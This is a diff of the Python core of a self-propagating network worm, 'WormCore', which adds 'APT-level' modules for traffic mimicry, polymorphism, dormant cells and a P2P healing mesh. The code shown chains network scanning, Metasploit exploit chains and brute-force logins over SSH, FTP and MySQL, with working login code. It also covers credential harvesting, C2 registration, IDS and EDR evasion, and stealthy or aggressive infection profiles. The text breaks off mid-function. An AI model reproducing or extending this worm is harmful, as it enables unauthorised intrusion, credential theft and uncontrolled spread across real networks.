@@ -12,7 +12,6 @@ Polymorphic Evasion, C2 Server, Async Exploitation, Audit Reports, Interactive C
 """
 
 
-
 import time
 import sys
 import os
@@ -39,6 +38,7 @@ from rl_engine import PropagationAgent, RealWorldPropagationAgent
 # Professional engines
 try:
     from scanner.professional_scanner import ProfessionalScanner, ServiceDetector
+
     PRO_SCANNER_AVAILABLE = True
 except ImportError:
     PRO_SCANNER_AVAILABLE = False
@@ -47,6 +47,7 @@ except ImportError:
 
 try:
     from exploits.brute_force_engine import BruteForceEngine, PasswordGenerator
+
     BRUTE_FORCE_AVAILABLE = True
 except ImportError:
     BRUTE_FORCE_AVAILABLE = False
@@ -55,6 +56,7 @@ except ImportError:
 
 try:
     from exploits.exploit_engine import VulnerabilityScanner, ExploitChain
+
     EXPLOIT_ENGINE_AVAILABLE = True
 except ImportError:
     EXPLOIT_ENGINE_AVAILABLE = False
@@ -63,6 +65,7 @@ except ImportError:
 
 try:
     from exploits.async_exploit import AsyncExploitDispatcher
+
     ASYNC_EXPLOIT_AVAILABLE = True
 except ImportError:
     ASYNC_EXPLOIT_AVAILABLE = False
@@ -71,6 +74,7 @@ except ImportError:
 # New modules
 try:
     from core.knowledge_graph import NetworkKnowledgeGraph
+
     KNOWLEDGE_GRAPH_AVAILABLE = True
 except ImportError:
     KNOWLEDGE_GRAPH_AVAILABLE = False
@@ -78,6 +82,7 @@ except ImportError:
 
 try:
     from post_exploit.lateral_movement import LateralMovementEngine
+
     LATERAL_MOVEMENT_AVAILABLE = True
 except ImportError:
     LATERAL_MOVEMENT_AVAILABLE = False
@@ -85,6 +90,7 @@ except ImportError:
 
 try:
     from evasion.polymorphic_engine import PolymorphicEngine
+
     POLYMORPHIC_AVAILABLE = True
 except ImportError:
     POLYMORPHIC_AVAILABLE = False
@@ -92,6 +98,7 @@ except ImportError:
 
 try:
     from utils.audit_report import AuditReportGenerator
+
     AUDIT_REPORT_AVAILABLE = True
 except ImportError:
     AUDIT_REPORT_AVAILABLE = False
@@ -99,6 +106,7 @@ except ImportError:
 
 try:
     from monitoring.cli_monitor import CLIMonitor, WormActivityBridge
+
     CLI_MONITOR_AVAILABLE = True
 except ImportError:
     CLI_MONITOR_AVAILABLE = False
@@ -108,6 +116,7 @@ except ImportError:
 # C2 Server
 try:
     from c2.multi_protocol_c2 import MultiProtocolC2
+
     C2_AVAILABLE = True
 except ImportError:
     C2_AVAILABLE = False
@@ -116,48 +125,107 @@ except ImportError:
 # Host Monitor
 try:
     from monitoring.host_monitor import HostMonitor, HostState
+
     HOST_MONITOR_AVAILABLE = True
 except ImportError:
     HOST_MONITOR_AVAILABLE = False
     HostMonitor = None
     HostState = None
 
+# APT-Level Adaptive Cycle Components
+try:
+    from core.predictive_recon import PredictiveScanner, BayesianNetworkAnalyzer
+
+    PREDICTIVE_RECON_AVAILABLE = True
+except ImportError:
+    PREDICTIVE_RECON_AVAILABLE = False
+    PredictiveScanner = None
+    BayesianNetworkAnalyzer = None
+
+try:
+    from exploits.adaptive_exploit_selector import AdaptiveExploitSelector
+
+    ADAPTIVE_EXPLOIT_AVAILABLE = True
+except ImportError:
+    ADAPTIVE_EXPLOIT_AVAILABLE = False
+    AdaptiveExploitSelector = None
+
+try:
+    from core.distributed_redundancy import DistributedRedundancy
+
+    DISTRIBUTED_REDUNDANCY_AVAILABLE = True
+except ImportError:
+    DISTRIBUTED_REDUNDANCY_AVAILABLE = False
+    DistributedRedundancy = None
+
+try:
+    from evasion.traffic_mimicry import TrafficMimicryEngine
+
+    TRAFFIC_MIMICRY_AVAILABLE = True
+except ImportError:
+    TRAFFIC_MIMICRY_AVAILABLE = False
+    TrafficMimicryEngine = None
+
+try:
+    from evasion.semantic_polymorphism import SemanticPolymorphicEngine
+
+    SEMANTIC_POLYMORPHISM_AVAILABLE = True
+except ImportError:
+    SEMANTIC_POLYMORPHISM_AVAILABLE = False
+    SemanticPolymorphicEngine = None
+
+try:
+    from core.dormant_cells import DormantCellManager
+
+    DORMANT_CELLS_AVAILABLE = True
+except ImportError:
+    DORMANT_CELLS_AVAILABLE = False
+    DormantCellManager = None
+
+try:
+    from core.adaptive_cycle import AdaptiveCycle
+
+    ADAPTIVE_CYCLE_AVAILABLE = True
+except ImportError:
+    ADAPTIVE_CYCLE_AVAILABLE = False
+    AdaptiveCycle = None
+
 # Config profiles
 CONFIG_PROFILES = {
-    'stealth': {
-        'propagation_delay': 10.0,
-        'max_infections': 10,
-        'stealth_mode': True,
-        'randomize_timing': True,
-        'max_scan_rate': 10,
-        'detect_ids': True,
-        'detect_honeypots': True,
-        'max_runtime_hours': 8,
-        'use_pretrained': True,
+    "stealth": {
+        "propagation_delay": 10.0,
+        "max_infections": 10,
+        "stealth_mode": True,
+        "randomize_timing": True,
+        "max_scan_rate": 10,
+        "detect_ids": True,
+        "detect_honeypots": True,
+        "max_runtime_hours": 8,
+        "use_pretrained": True,
     },
-    'aggressive': {
-        'propagation_delay': 0.5,
-        'max_infections': 100,
-        'stealth_mode': False,
-        'randomize_timing': False,
-        'max_scan_rate': 500,
-        'detect_ids': False,
-        'detect_honeypots': False,
-        'max_runtime_hours': 2,
-        'use_pretrained': False,
+    "aggressive": {
+        "propagation_delay": 0.5,
+        "max_infections": 100,
+        "stealth_mode": False,
+        "randomize_timing": False,
+        "max_scan_rate": 500,
+        "detect_ids": False,
+        "detect_honeypots": False,
+        "max_runtime_hours": 2,
+        "use_pretrained": False,
     },
-    'audit': {
-        'propagation_delay': 3.0,
-        'max_infections': 50,
-        'stealth_mode': True,
-        'randomize_timing': True,
-        'max_scan_rate': 50,
-        'detect_ids': True,
-        'detect_honeypots': True,
-        'max_runtime_hours': 4,
-        'use_pretrained': True,
-        'enable_logging': True,
-        'log_encryption': True,
+    "audit": {
+        "propagation_delay": 3.0,
+        "max_infections": 50,
+        "stealth_mode": True,
+        "randomize_timing": True,
+        "max_scan_rate": 50,
+        "detect_ids": True,
+        "detect_honeypots": True,
+        "max_runtime_hours": 4,
+        "use_pretrained": True,
+        "enable_logging": True,
+        "log_encryption": True,
     },
 }
 
@@ -170,8 +238,14 @@ class WormCore:
     C2 server, async exploitation, and audit reporting.
     """
 
-    def __init__(self, config_file: str = None, use_cli_monitor: bool = True,
-                 profile: str = None, dry_run: bool = False, interactive: bool = False):
+    def __init__(
+        self,
+        config_file: str = None,
+        use_cli_monitor: bool = True,
+        profile: str = None,
+        dry_run: bool = False,
+        interactive: bool = False,
+    ):
         """Initialize worm with configuration"""
         self.dry_run = dry_run
         self.interactive = interactive
@@ -214,7 +288,7 @@ class WormCore:
         if PRO_SCANNER_AVAILABLE:
             self.pro_scanner = ProfessionalScanner(
                 max_concurrency=self.config.network.max_threads,
-                timeout=self.config.network.scan_timeout
+                timeout=self.config.network.scan_timeout,
             )
             logger.info("Professional Scanner: enabled")
         self.scanner = IntelligentScanner(self.config, use_ml=True)
@@ -227,6 +301,7 @@ class WormCore:
 
         # Exploit Manager (includes CredentialManager)
         from exploits.exploit_manager import ExploitManager
+
         self.exploit_manager = ExploitManager(self.config)
 
         # Credential Manager reference
@@ -237,7 +312,7 @@ class WormCore:
         if BRUTE_FORCE_AVAILABLE and self.cred_manager:
             self.brute_force_engine = BruteForceEngine(
                 credential_manager=self.cred_manager,
-                password_generator=self.exploit_manager.password_generator
+                password_generator=self.exploit_manager.password_generator,
             )
             logger.info("Brute Force Engine: enabled")
 
@@ -256,7 +331,7 @@ class WormCore:
                 exploit_manager=self.exploit_manager,
                 credential_manager=self.cred_manager,
                 max_concurrency=5,
-                target_timeout=30.0
+                target_timeout=30.0,
             )
             logger.info("Async Exploit Dispatcher: enabled")
 
@@ -284,20 +359,15 @@ class WormCore:
         # Host Monitor (with payload mutation per host)
         self.host_monitor = None
         if HOST_MONITOR_AVAILABLE:
-            self.host_monitor = HostMonitor(
-                polymorphic_engine=self.polymorphic_engine
-            )
+            self.host_monitor = HostMonitor(polymorphic_engine=self.polymorphic_engine)
             logger.info("Host Monitor: enabled (payload mutation per host)")
 
         # Web Dashboard
         self.web_dashboard = None
         try:
             from monitoring.web_dashboard import WebDashboard
-            self.web_dashboard = WebDashboard(
-                worm_core=self,
-                host='0.0.0.0',
-                port=5000
-            )
+
+            self.web_dashboard = WebDashboard(worm_core=self, host="0.0.0.0", port=5000)
             logger.info("Web Dashboard: enabled (http://0.0.0.0:5000)")
         except Exception as e:
             logger.warning(f"Web Dashboard failed to initialize: {e}")
@@ -307,16 +377,16 @@ class WormCore:
         try:
             from monitoring.armitage_dashboard import ArmitageDashboard
             from training.realistic_training import RealisticTrainer
+
             trainer = None
             try:
-                trainer = RealisticTrainer(self.config.ml.rl_agent_path.replace('.h5', ''))
+                trainer = RealisticTrainer(
+                    self.config.ml.rl_agent_path.replace(".h5", "")
+                )
             except Exception:
                 pass
             self.armitage_dashboard = ArmitageDashboard(
-                worm_core=self,
-                trainer=trainer,
-                host='0.0.0.0',
-                port=5001
+                worm_core=self, trainer=trainer, host="0.0.0.0", port=5001
             )
             logger.info("Armitage Dashboard: enabled (http://0.0.0.0:5001)")
         except Exception as e:
@@ -329,12 +399,63 @@ class WormCore:
         from evasion.anti_forensics import AntiForensics
         from evasion.edr_bypass import EDRBypass
         from evasion.memory_execution import MemoryExecution
+
         self.ids_detector = IDSDetector(self.config)
         self.stealth_engine = StealthEngine(self.config)
         self.ids_evasion = IDSEvasionEngine(self.config)
         self.anti_forensics = AntiForensics()
         self.edr_bypass = EDRBypass()
         self.memory_execution = MemoryExecution()
+
+        # APT-Level Adaptive Cycle Components
+        self.adaptive_cycle = None
+        if ADAPTIVE_CYCLE_AVAILABLE:
+            try:
+                local_ip = get_local_ip()
+                self.adaptive_cycle = AdaptiveCycle(
+                    host_ip=local_ip,
+                    host_id="wormy_main",
+                )
+                logger.info("Adaptive Cycle: enabled (APT-Level)")
+            except Exception as e:
+                logger.warning(f"Adaptive Cycle failed to initialize: {e}")
+
+        # Individual APT components (for granular control)
+        self.predictive_scanner = None
+        if PREDICTIVE_RECON_AVAILABLE:
+            self.predictive_scanner = PredictiveScanner()
+            logger.info("Predictive Reconnaissance: enabled")
+
+        self.adaptive_exploit_selector = None
+        if ADAPTIVE_EXPLOIT_AVAILABLE:
+            self.adaptive_exploit_selector = AdaptiveExploitSelector()
+            logger.info("Adaptive Exploit Selector: enabled (Thompson Sampling)")
+
+        self.distributed_redundancy = None
+        if DISTRIBUTED_REDUNDANCY_AVAILABLE:
+            try:
+                local_ip = get_local_ip()
+                self.distributed_redundancy = DistributedRedundancy(
+                    host_ip=local_ip, host_id="wormy_main"
+                )
+                logger.info("Distributed Redundancy: enabled (P2P healing mesh)")
+            except Exception as e:
+                logger.warning(f"Distributed Redundancy failed: {e}")
+
+        self.traffic_mimicry = None
+        if TRAFFIC_MIMICRY_AVAILABLE:
+            self.traffic_mimicry = TrafficMimicryEngine()
+            logger.info("Traffic Mimicry: enabled (protocol tunneling)")
+
+        self.semantic_polymorphism = None
+        if SEMANTIC_POLYMORPHISM_AVAILABLE:
+            self.semantic_polymorphism = SemanticPolymorphicEngine()
+            logger.info("Semantic Polymorphism: enabled (AST manipulation)")
+
+        self.dormant_cells = None
+        if DORMANT_CELLS_AVAILABLE:
+            self.dormant_cells = DormantCellManager()
+            logger.info("Dormant Cells: enabled (staged loading)")
 
         # RL Agent - Auto-training if no model exists
         state_size = 300  # 20 hosts * 15 features
@@ -343,7 +464,9 @@ class WormCore:
 
         # Try to load pre-trained model
         model_loaded = False
-        if self.config.ml.use_pretrained and os.path.exists(self.config.ml.rl_agent_path):
+        if self.config.ml.use_pretrained and os.path.exists(
+            self.config.ml.rl_agent_path
+        ):
             try:
                 self.rl_agent.load(self.config.ml.rl_agent_path)
                 logger.info("Pretrained RL model loaded")
@@ -354,18 +477,26 @@ class WormCore:
         # Auto-train if no model exists
         if not model_loaded and self.config.ml.use_pretrained:
             try:
-                from training.realistic_training import auto_train_if_needed, RealisticTrainer
+                from training.realistic_training import (
+                    auto_train_if_needed,
+                    RealisticTrainer,
+                )
+
                 save_dir = self.config.ml.rl_agent_path
                 # Handle both file path and directory
-                if save_dir.endswith(('.h5', '.zip', '.pt')):
+                if save_dir.endswith((".h5", ".zip", ".pt")):
                     save_dir = os.path.dirname(save_dir)
                 if not save_dir:
-                    save_dir = 'saved/rl_agent'
+                    save_dir = "saved/rl_agent"
                 trainer = RealisticTrainer(save_dir)
 
                 if trainer.needs_training():
-                    logger.info("No pre-trained model found. Starting auto-training on realistic scenarios...")
-                    logger.info("Scenarios: small_office → enterprise → datacenter → cloud → iot")
+                    logger.info(
+                        "No pre-trained model found. Starting auto-training on realistic scenarios..."
+                    )
+                    logger.info(
+                        "Scenarios: small_office → enterprise → datacenter → cloud → iot"
+                    )
                     logger.info("This may take a few minutes...")
                     auto_train_if_needed(save_dir)
 
@@ -373,11 +504,15 @@ class WormCore:
                 if os.path.exists(trainer.best_model_path):
                     self.rl_agent.load(trainer.best_model_path)
                     self.rl_agent.epsilon = 0.1  # Low exploration for operation
-                    logger.info(f"Auto-trained model loaded (best reward: {trainer.best_reward:.2f})")
+                    logger.info(
+                        f"Auto-trained model loaded (best reward: {trainer.best_reward:.2f})"
+                    )
                     model_loaded = True
             except Exception as e:
                 logger.warning(f"Auto-training failed: {e}")
-                logger.info("Continuing with random weights (agent will learn during operation)")
+                logger.info(
+                    "Continuing with random weights (agent will learn during operation)"
+                )
 
         self.real_world_agent = RealWorldPropagationAgent(self.rl_agent, action_size)
 
@@ -397,21 +532,21 @@ class WormCore:
 
         # Statistics
         self.stats = {
-            'scans': 0,
-            'infections': 0,
-            'failed_exploits': 0,
-            'total_hosts_discovered': 0,
-            'lateral_movements': 0,
-            'lateral_success': 0,
-            'credentials_discovered': 0,
-            'polymorphic_mutations': 0,
-            'vulnerabilities_found': 0,
-            'exploit_chains_built': 0,
-            'brute_force_attempts': 0,
-            'brute_force_successes': 0,
-            'c2_beacons': 0,
-            'start_time': None,
-            'end_time': None,
+            "scans": 0,
+            "infections": 0,
+            "failed_exploits": 0,
+            "total_hosts_discovered": 0,
+            "lateral_movements": 0,
+            "lateral_success": 0,
+            "credentials_discovered": 0,
+            "polymorphic_mutations": 0,
+            "vulnerabilities_found": 0,
+            "exploit_chains_built": 0,
+            "brute_force_attempts": 0,
+            "brute_force_successes": 0,
+            "c2_beacons": 0,
+            "start_time": None,
+            "end_time": None,
         }
 
     def _apply_profile(self, profile: str):
@@ -439,26 +574,33 @@ class WormCore:
             return False
 
         if len(self.infected_hosts) >= self.config.propagation.max_infections:
-            logger.warning(f"Max infections reached: {self.config.propagation.max_infections}")
+            logger.warning(
+                f"Max infections reached: {self.config.propagation.max_infections}"
+            )
             return False
 
         if self.start_time and self.config.safety.max_runtime_hours > 0:
             elapsed = datetime.now() - self.start_time
             max_runtime = timedelta(hours=self.config.safety.max_runtime_hours)
             if elapsed > max_runtime:
-                logger.warning(f"Max runtime exceeded: {self.config.safety.max_runtime_hours}h")
+                logger.warning(
+                    f"Max runtime exceeded: {self.config.safety.max_runtime_hours}h"
+                )
                 return False
 
         if self.start_time and self.config.safety.auto_destruct_time > 0:
             elapsed = datetime.now() - self.start_time
             destruct_time = timedelta(hours=self.config.safety.auto_destruct_time)
             if elapsed > destruct_time:
-                logger.critical(f"Auto-destruct timer: {self.config.safety.auto_destruct_time}h")
+                logger.critical(
+                    f"Auto-destruct timer: {self.config.safety.auto_destruct_time}h"
+                )
                 self.self_destruct()
                 return False
 
         if self.config.safety.geofence_enabled:
             from utils.network_utils import get_local_ip, is_ip_in_range
+
             local_ip = get_local_ip()
             in_allowed = any(
                 is_ip_in_range(local_ip, net)
@@ -486,7 +628,7 @@ class WormCore:
         if self.activity_bridge:
             self.activity_bridge.on_scan_start(self.config.network.target_ranges)
 
-        self.stats['scans'] += 1
+        self.stats["scans"] += 1
 
         # Use professional scanner if available
         if use_professional and self.pro_scanner:
@@ -496,7 +638,14 @@ class WormCore:
                 results = loop.run_until_complete(
                     self.pro_scanner.scan_network(
                         self.config.network.target_ranges,
-                        categories=['essential', 'windows', 'linux', 'database', 'web', 'remote']
+                        categories=[
+                            "essential",
+                            "windows",
+                            "linux",
+                            "database",
+                            "web",
+                            "remote",
+                        ],
                     )
                 )
             finally:
@@ -505,23 +654,23 @@ class WormCore:
             results = self.scanner.scan_network(self.config.network.target_ranges)
 
         self.scan_results = results
-        self.stats['total_hosts_discovered'] = len(results)
+        self.stats["total_hosts_discovered"] = len(results)
 
         # Update knowledge graph
         if self.knowledge_graph:
             for host in results:
-                ip = host.get('ip', '')
+                ip = host.get("ip", "")
                 self.knowledge_graph.add_host(
                     ip,
-                    os_guess=host.get('os_guess', 'Unknown'),
-                    ports=host.get('open_ports', []),
+                    os_guess=host.get("os_guess", "Unknown"),
+                    ports=host.get("open_ports", []),
                     is_infected=ip in self.infected_hosts,
-                    is_high_value=host.get('vulnerability_score', 0) > 70,
-                    subnet=host.get('subnet', ''),
+                    is_high_value=host.get("vulnerability_score", 0) > 70,
+                    subnet=host.get("subnet", ""),
                 )
 
                 # Add services
-                services = host.get('services', {})
+                services = host.get("services", {})
                 if isinstance(services, dict):
                     for port_str, svc_name in services.items():
                         try:
@@ -539,25 +688,27 @@ class WormCore:
             for host in results:
                 vulns = self.vuln_scanner.scan_target(host)
                 if vulns:
-                    host['vulnerabilities'] = vulns
-                    self.stats['vulnerabilities_found'] += len(vulns)
+                    host["vulnerabilities"] = vulns
+                    self.stats["vulnerabilities_found"] += len(vulns)
 
                     # Build exploit chains
                     if self.exploit_chain:
                         chain = self.exploit_chain.build_chain(host)
                         if chain:
-                            host['exploit_chain'] = chain
-                            self.stats['exploit_chains_built'] += 1
+                            host["exploit_chain"] = chain
+                            self.stats["exploit_chains_built"] += 1
 
         if self.activity_bridge:
             for host in results:
                 self.activity_bridge.on_host_discovered(
-                    host['ip'],
-                    host.get('open_ports', []),
-                    host.get('os_guess', 'Unknown')
+                    host["ip"],
+                    host.get("open_ports", []),
+                    host.get("os_guess", "Unknown"),
                 )
 
-        logger.success(f"Discovered {len(results)} hosts, {self.stats['vulnerabilities_found']} vulnerabilities")
+        logger.success(
+            f"Discovered {len(results)} hosts, {self.stats['vulnerabilities_found']} vulnerabilities"
+        )
         self.real_world_agent.update_state(results, self.infected_hosts)
         return results
 
@@ -573,8 +724,10 @@ class WormCore:
             if high_value:
                 for hv_ip in high_value:
                     for host in self.scan_results:
-                        if host['ip'] == hv_ip and hv_ip not in self.infected_hosts:
-                            logger.info(f"Knowledge Graph: prioritizing high-value target {hv_ip}")
+                        if host["ip"] == hv_ip and hv_ip not in self.infected_hosts:
+                            logger.info(
+                                f"Knowledge Graph: prioritizing high-value target {hv_ip}"
+                            )
                             if self.activity_bridge:
                                 self.activity_bridge.on_ml_decision(hv_ip, 0.9)
                             return host
@@ -584,17 +737,22 @@ class WormCore:
             best_vuln_target = None
             best_vuln_score = 0
             for host in self.scan_results:
-                if host['ip'] in self.infected_hosts or host['ip'] in self.failed_targets:
+                if (
+                    host["ip"] in self.infected_hosts
+                    or host["ip"] in self.failed_targets
+                ):
                     continue
-                vulns = host.get('vulnerabilities', [])
+                vulns = host.get("vulnerabilities", [])
                 if vulns:
-                    max_cvss = max(v.get('cvss', 0) for v in vulns)
+                    max_cvss = max(v.get("cvss", 0) for v in vulns)
                     if max_cvss > best_vuln_score:
                         best_vuln_score = max_cvss
                         best_vuln_target = host
 
             if best_vuln_target and best_vuln_score >= 9.0:
-                logger.info(f"Vulnerability Scanner: prioritizing {best_vuln_target['ip']} (CVSS: {best_vuln_score})")
+                logger.info(
+                    f"Vulnerability Scanner: prioritizing {best_vuln_target['ip']} (CVSS: {best_vuln_score})"
+                )
                 return best_vuln_target
 
         # 3. RL agent selection
@@ -604,24 +762,23 @@ class WormCore:
             logger.log_ml_decision(
                 "RL_Agent",
                 f"Target: {target['ip']}",
-                target.get('confidence', 0.5),
+                target.get("confidence", 0.5),
                 {
-                    'ip': target['ip'],
-                    'priority': target.get('priority', 0),
-                    'vuln_score': target.get('vulnerability_score', 0)
-                }
+                    "ip": target["ip"],
+                    "priority": target.get("priority", 0),
+                    "vuln_score": target.get("vulnerability_score", 0),
+                },
             )
             if self.activity_bridge:
                 self.activity_bridge.on_ml_decision(
-                    target['ip'],
-                    target.get('confidence', 0.5)
+                    target["ip"], target.get("confidence", 0.5)
                 )
 
         return target
 
     def exploit_target(self, target: Dict) -> bool:
         """Exploit target with full professional engine integration"""
-        ip = target['ip']
+        ip = target["ip"]
         logger.info(f"Attempting to exploit {ip}")
 
         if ip in self.infected_hosts:
@@ -640,22 +797,24 @@ class WormCore:
         if self.polymorphic_engine and self.config.evasion.stealth_mode:
             net_sig = self.polymorphic_engine.mutate_network_signature()
             logger.debug(f"Polymorphic network signature applied for {ip}")
-            self.stats['polymorphic_mutations'] += 1
+            self.stats["polymorphic_mutations"] += 1
 
         # Active IDS/IPS evasion
         if self.ids_evasion and self.config.evasion.stealth_mode:
             evasion_strategy = self.ids_evasion.adaptive_evasion(
-                ip, self._detection_events if hasattr(self, '_detection_events') else []
+                ip, self._detection_events if hasattr(self, "_detection_events") else []
             )
-            logger.debug(f"IDS evasion strategy: {evasion_strategy['strategy']} (risk: {evasion_strategy['risk_level']:.2f})")
+            logger.debug(
+                f"IDS evasion strategy: {evasion_strategy['strategy']} (risk: {evasion_strategy['risk_level']:.2f})"
+            )
 
             # Generate decoy traffic to confuse IDS
-            if 'decoys' in evasion_strategy['techniques']:
+            if "decoys" in evasion_strategy["techniques"]:
                 decoys = self.ids_evasion.generate_decoy_traffic(ip, count=3)
                 logger.debug(f"Generated {len(decoys)} decoy traffic patterns")
 
             # Protocol mimicry
-            if 'protocol_mimicry' in evasion_strategy['techniques']:
+            if "protocol_mimicry" in evasion_strategy["techniques"]:
                 logger.debug("Protocol mimicry enabled")
 
         # Stealth delay
@@ -672,32 +831,46 @@ class WormCore:
         if self.dry_run:
             logger.info(f"[DRY RUN] Would exploit {ip}")
             self.infected_hosts.add(ip)
-            self.stats['infections'] += 1
+            self.stats["infections"] += 1
             if self.knowledge_graph:
                 self.knowledge_graph.mark_infected(ip, "dry_run")
             return True
 
         # 1. Try exploit chains first (highest priority)
-        if target.get('exploit_chain'):
-            chain = target['exploit_chain']
+        if target.get("exploit_chain"):
+            chain = target["exploit_chain"]
             for step in chain:
-                if step['phase'] == 'initial_access' and step.get('msf_module'):
+                if step["phase"] == "initial_access" and step.get("msf_module"):
                     # Try via Metasploit if available
-                    if self.exploit_manager.use_metasploit and self.exploit_manager.msf_client:
-                        exploit_key = self._msf_module_to_key(step['msf_module'])
+                    if (
+                        self.exploit_manager.use_metasploit
+                        and self.exploit_manager.msf_client
+                    ):
+                        exploit_key = self._msf_module_to_key(step["msf_module"])
                         if exploit_key:
-                            success, result = self.exploit_manager._try_metasploit_exploits(target)
+                            success, result = (
+                                self.exploit_manager._try_metasploit_exploits(target)
+                            )
                             if success:
-                                return self._handle_successful_exploit(ip, target, result)
+                                return self._handle_successful_exploit(
+                                    ip, target, result
+                                )
 
         # 2. Try brute force engine
         if self.brute_force_engine:
             bf_results = self._try_brute_force(target)
             if bf_results:
-                return self._handle_successful_exploit(ip, target, {
-                    'method': f'brute_force_{bf_results[0].get("service", "unknown")}',
-                    'credentials': (bf_results[0].get('username', ''), bf_results[0].get('password', '')),
-                })
+                return self._handle_successful_exploit(
+                    ip,
+                    target,
+                    {
+                        "method": f"brute_force_{bf_results[0].get('service', 'unknown')}",
+                        "credentials": (
+                            bf_results[0].get("username", ""),
+                            bf_results[0].get("password", ""),
+                        ),
+                    },
+                )
 
         # 3. Try exploit manager (native exploits)
         success, result = self.exploit_manager.exploit_target(target)
@@ -706,78 +879,89 @@ class WormCore:
             return self._handle_successful_exploit(ip, target, result)
         else:
             self.failed_targets.add(ip)
-            self.stats['failed_exploits'] += 1
+            self.stats["failed_exploits"] += 1
 
             if self.activity_bridge:
-                self.activity_bridge.on_exploit_failed(ip, 'Unknown')
+                self.activity_bridge.on_exploit_failed(ip, "Unknown")
 
             if self.knowledge_graph:
-                self.knowledge_graph.record_exploit_attempt(ip, 'Unknown', False)
+                self.knowledge_graph.record_exploit_attempt(ip, "Unknown", False)
 
             self.real_world_agent.provide_feedback(target, False, -5)
-            self.stealth_engine.record_action(ip, 'exploit_failed')
+            self.stealth_engine.record_action(ip, "exploit_failed")
             return False
 
     def _handle_successful_exploit(self, ip: str, target: Dict, result: Dict) -> bool:
         """Handle a successful exploitation"""
-        exploit_name = result.get('method', 'Unknown')
-        logger.log_infection(ip, exploit_name, {
-            'os': target.get('os_guess', 'Unknown'),
-            'ports': target.get('open_ports', []),
-            'exploit_result': result
-        })
+        exploit_name = result.get("method", "Unknown")
+        logger.log_infection(
+            ip,
+            exploit_name,
+            {
+                "os": target.get("os_guess", "Unknown"),
+                "ports": target.get("open_ports", []),
+                "exploit_result": result,
+            },
+        )
 
         if self.activity_bridge:
             self.activity_bridge.on_exploit_success(ip, exploit_name)
             self.activity_bridge.on_infection(ip, exploit_name)
 
         self.infected_hosts.add(ip)
-        self.stats['infections'] += 1
+        self.stats["infections"] += 1
 
         # Update knowledge graph
         if self.knowledge_graph:
             self.knowledge_graph.mark_infected(ip, exploit_name)
 
             # Record credentials from exploit result
-            if 'credentials' in result:
-                creds = result['credentials']
+            if "credentials" in result:
+                creds = result["credentials"]
                 if isinstance(creds, tuple) and len(creds) == 2:
                     self.cred_manager.add_discovered_credential(
                         creds[0], creds[1], source=exploit_name
                     )
-                    self.stats['credentials_discovered'] += 1
+                    self.stats["credentials_discovered"] += 1
 
         # Register with Host Monitor (unique payload mutation)
         if self.host_monitor:
             host_state = self.host_monitor.register_host(
                 ip,
-                os_guess=target.get('os_guess', 'Unknown'),
-                ports=target.get('open_ports', []),
-                exploit_method=exploit_name
+                os_guess=target.get("os_guess", "Unknown"),
+                ports=target.get("open_ports", []),
+                exploit_method=exploit_name,
             )
             self.host_monitor.record_host_activity(
-                ip, 'infection',
+                ip,
+                "infection",
                 f"Infected via {exploit_name}",
-                {'os': target.get('os_guess', 'Unknown'), 'ports': target.get('open_ports', [])}
+                {
+                    "os": target.get("os_guess", "Unknown"),
+                    "ports": target.get("open_ports", []),
+                },
             )
 
         # RL feedback
-        reward = 20 + target.get('vulnerability_score', 0) / 5
-        if target.get('vulnerability_score', 0) > 70:
+        reward = 20 + target.get("vulnerability_score", 0) / 5
+        if target.get("vulnerability_score", 0) > 70:
             reward += 15  # High-value bonus
         self.real_world_agent.provide_feedback(target, True, reward)
 
-        self.stealth_engine.record_action(ip, 'exploit_success')
+        self.stealth_engine.record_action(ip, "exploit_success")
 
         # C2 beacon
         if self.c2_server:
             try:
-                self.c2_server.register_host(ip, {
-                    'os': target.get('os_guess', 'Unknown'),
-                    'ports': target.get('open_ports', []),
-                    'exploit': exploit_name,
-                })
-                self.stats['c2_beacons'] += 1
+                self.c2_server.register_host(
+                    ip,
+                    {
+                        "os": target.get("os_guess", "Unknown"),
+                        "ports": target.get("open_ports", []),
+                        "exploit": exploit_name,
+                    },
+                )
+                self.stats["c2_beacons"] += 1
             except Exception:
                 pass
 
@@ -791,85 +975,125 @@ class WormCore:
         if not self.brute_force_engine:
             return []
 
-        ip = target['ip']
-        ports = target.get('open_ports', [])
+        ip = target["ip"]
+        ports = target.get("open_ports", [])
 
         # Determine services to brute force
         services = []
         if 22 in ports:
-            services.append(('ssh', 22))
+            services.append(("ssh", 22))
         if 445 in ports or 139 in ports:
-            services.append(('smb', 445 if 445 in ports else 139))
+            services.append(("smb", 445 if 445 in ports else 139))
         if 21 in ports:
-            services.append(('ftp', 21))
+            services.append(("ftp", 21))
         if 3306 in ports:
-            services.append(('mysql', 3306))
+            services.append(("mysql", 3306))
         if 5432 in ports:
-            services.append(('postgres', 5432))
+            services.append(("postgres", 5432))
         if 3389 in ports:
-            services.append(('rdp', 3389))
+            services.append(("rdp", 3389))
         if 23 in ports:
-            services.append(('telnet', 23))
+            services.append(("telnet", 23))
 
         results = []
         for service, port in services[:3]:  # Try top 3 services
+
             def login_func(tgt_ip, tgt_port, username, password):
-                return self._try_service_login(tgt_ip, tgt_port, service, username, password)
+                return self._try_service_login(
+                    tgt_ip, tgt_port, service, username, password
+                )
 
             bf_results = self.brute_force_engine.brute_force(
-                ip, service, port,
+                ip,
+                service,
+                port,
                 login_func=login_func,
                 max_attempts=20,
-                target_info=target
+                target_info=target,
             )
             if bf_results:
                 results.extend(bf_results)
-                self.stats['brute_force_successes'] += len(bf_results)
+                self.stats["brute_force_successes"] += len(bf_results)
 
-            self.stats['brute_force_attempts'] += 1
+            self.stats["brute_force_attempts"] += 1
 
         return results
 
-    def _try_service_login(self, ip: str, port: int, service: str,
-                           username: str, password: str) -> bool:
+    def _try_service_login(
+        self, ip: str, port: int, service: str, username: str, password: str
+    ) -> bool:
         """Try login on a specific service"""
         try:
-            if service == 'ssh':
+            if service == "ssh":
                 import paramiko
+
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, port=port, username=username, password=password, timeout=5)
+                client.connect(
+                    ip, port=port, username=username, password=password, timeout=5
+                )
                 client.close()
                 return True
-            elif service == 'ftp':
+            elif service == "ftp":
                 from ftplib import FTP
+
                 ftp = FTP()
                 ftp.connect(ip, port, timeout=5)
                 ftp.login(username, password)
                 ftp.quit()
                 return True
-            elif service == 'mysql':
+            elif service == "mysql":
                 import mysql.connector
-                conn = mysql.connector.connect(host=ip, port=port, user=username, password=password, connect_timeout=5)
+
+                conn = mysql.connector.connect(
+                    host=ip,
+                    port=port,
+                    user=username,
+                    password=password,
+                    connect_timeout=5,
+                )
                 conn.close()
                 return True
-            elif service == 'smb':
